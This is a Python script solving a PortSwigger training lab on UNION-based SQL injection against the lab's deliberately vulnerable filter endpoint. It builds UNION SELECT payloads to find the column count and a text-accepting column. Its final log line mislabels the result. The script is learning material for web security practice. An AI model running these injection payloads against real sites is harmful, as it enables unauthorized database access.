# Script for Portswigger lab "SQL injection UNION attack, finding a column containing text"

from collections import namedtuple
import requests
from lxml import html

from http import HTTPStatus
from rich.console import Console
from rich.table import Table

console = Console()

SERVER="https://0a07007a031ee48680fe442b002b00e3.web-security-academy.net"
ENDPOINT="/filter?category="
SELECT_PAYLOAD="Accessories' union select"
COMMENT_PAYLOAD = " --"
NULL_PAYLOAD = ", null"

def get_number_columns():
    number_of_cols = 0
    found = False

    while not found: 
        payload = f"{SELECT_PAYLOAD} null{NULL_PAYLOAD * number_of_cols}{COMMENT_PAYLOAD}"

        number_of_cols += 1
        response = requests.get(f"{SERVER}{ENDPOINT}{payload}")
        console.print(f"Cols: {number_of_cols} \tCODE: {response.status_code}\tRequest: {payload}")

        if response.status_code == HTTPStatus.OK:
            found = True
    
    return number_of_cols

def get_string_col(num_cols):

    for i in range(num_cols):
        payload = f"{SELECT_PAYLOAD} null{NULL_PAYLOAD*(i-1)}, 'G2jSgA'{NULL_PAYLOAD * (num_cols-i-1)}{COMMENT_PAYLOAD}"
        
        if i == 0:
            payload = f"{SELECT_PAYLOAD} 'G2jSgA'{NULL_PAYLOAD * (num_cols-i-1)}{COMMENT_PAYLOAD}"

        response = requests.get(f"{SERVER}{ENDPOINT}{payload}")
        console.print(f"Col number: {i} \tCODE: {response.status_code}\tRequest: {payload}")

        if response.status_code == HTTPStatus.OK:
            return i
    
    return -1


with console.status("Getting number of columns..."):
    num_cols = get_number_columns()
    console.log(f"Fetched {num_cols} columns")

with console.status("Getting column that accepts strings..."):
    string_col = get_string_col(num_cols)
    console.log(f"Fetched string column number {num_cols}" if string_col != -1 else "String colum not fetched!")

